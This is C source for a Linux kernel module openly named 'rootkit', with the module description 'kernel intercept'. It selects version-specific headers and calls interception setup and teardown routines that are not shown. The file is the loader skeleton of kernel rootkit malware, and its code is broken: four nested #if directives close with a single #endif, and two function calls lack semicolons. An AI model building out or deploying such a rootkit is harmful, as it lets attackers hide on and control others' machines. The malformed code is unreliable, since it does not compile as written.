#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>


#if (LINUX_VERSION_CODE >= KERNEL_VERSION(3,0,0)) && (LINUX_VERSION_CODE < KERNEL_VERSION(4,0,0))
#include "version/k3.h"
#if (LINUX_VERSION_CODE >= KERNEL_VERSION(4,0,0)) && (LINUX_VERSION_CODE < KERNEL_VERSION(5,0,0))
#include "version/k4.h"
#if (LINUX_VERSION_CODE >= KERNEL_VERSION(5,0,0)) && (LINUX_VERSION_CODE < KERNEL_VERSION(6,0,0))
#include "version/k5.h"
#if (LINUX_VERSION_CODE >= KERNEL_VERSION(6,0,0))
#include "version/k6.h"
#endif

static int __init rootkit_init(void)
{
    printk(KERN_INFO "rootkit: Loaded >:-)\n");
    init_intercept()
    return 0;
}

static void __exit rootkit_exit(void)
{
    exit_intercept()
    printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("midoks");
MODULE_DESCRIPTION("kernel intercept");
MODULE_VERSION("0.01");

module_init(rootkit_init);
module_exit(rootkit_exit);